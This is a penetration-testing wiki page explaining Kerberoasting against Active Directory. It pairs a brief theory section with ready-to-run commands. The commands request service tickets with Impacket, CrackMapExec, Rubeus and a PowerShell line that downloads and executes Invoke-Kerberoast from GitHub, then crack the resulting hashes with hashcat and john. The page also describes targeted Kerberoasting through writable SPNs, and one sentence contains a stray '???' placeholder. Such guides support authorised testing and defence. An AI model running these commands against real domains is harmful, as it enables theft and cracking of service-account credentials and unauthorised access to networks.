---
description: MITRE ATT&CK™ Sub-technique T1558.003
---

# Kerberoast

## Theory

When asking the KDC (Key Distribution Center) for a Service Ticket (ST), the requesting user needs to send a valid TGT (Ticket Granting Ticket) and the SPN (Service Principal Name) of the service wanted. If the TGT is valid, and if the SPN exists, the KDC sends the ST to the requesting user.

The ST is encrypted with the requested service account's NT hash. If an attacker has a valid TGT and knows a SPN for a service, he can request a ST for this service and crack it offline later in an attempt to retrieve that service account's password.

In most situations, services accounts are machine accounts, which have very complex, long, and random passwords. But if a service account, with a human-defined password, has a SPN set, attackers can request a ST for this service and attempt to crack it offline. This is Kerberoasting.

## Practice

{% hint style="warning" %}
Unlike [ASREProasting](asreproast.md), this attack can only be carried out with a prior foothold (valid domain credentials).
{% endhint %}

{% tabs %}
{% tab title="UNIX-like" %}
The [Impacket](https://github.com/SecureAuthCorp/impacket) script [GetUserSPNs](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) (Python) can perform all the necessary steps to request a ST for a service given its SPN and valid domain credentials.

```bash
# with a password
GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'

# with an NT hash
GetUserSPNs.py -outputfile kerberoastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
```

This can also be achieved with [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) (Python).

```bash
crackmapexec ldap $TARGETS -u $USER -p $PASSWORD --kerberoasting kerberoastables.txt --kdcHost $KeyDistributionCenter
```

Another alternative is the [kerberoast](https://github.com/skelsec/kerberoast) pure-python toolkit.

```bash
python3 kerberoast spnroast kerberos+pass://"domain"\\"user":"password"@"target" -u "target_user" -r "realm"
```
{% endtab %}

{% tab title="Windows" %}
The same thing can be done with [Rubeus](https://github.com/GhostPack/Rubeus) from a session running with a domain user privileges.

```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt
```

This can also be achieved with Powershell. Depending on the tool that the tester will use to attempt cracking the ???, the `-OutputFormat` can be set to `hashcat` or `john`.

```bash
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII kerberoastables.txt
```
{% endtab %}
{% endtabs %}

[Hashcat](https://github.com/hashcat/hashcat) and [JohnTheRipper](https://github.com/magnumripper/JohnTheRipper) can then be used to try [cracking the hash](../credentials/cracking.md).

```bash
hashcat -m 13100 kerberoastables.txt $wordlist
```

```bash
john --format=krb5tgs --wordlist=$wordlist kerberoastables.txt
```

### Targeted Kerberoasting

If an attacker controls an account with the rights to add an SPN to another ([`GenericAll`](../dacl/#genericall), [`GenericWrite`](../dacl/#genericwrite)), it can be abused to make that other account vulnerable to Kerberoast (see [exploitation](../dacl/targeted-kerberoasting.md)).

{% hint style="info" %}
Controlling a member of the [Account Operators](../domain-settings/builtin-groups.md) group, targeted Kerberoasting can be conducted for the whole domain (see [exploitation](../dacl/targeted-kerberoasting.md)).
{% endhint %}

## Resources

{% embed url="https://en.hackndo.com/kerberos" %}

{% embed url="https://adsecurity.org/?p=2011" %}
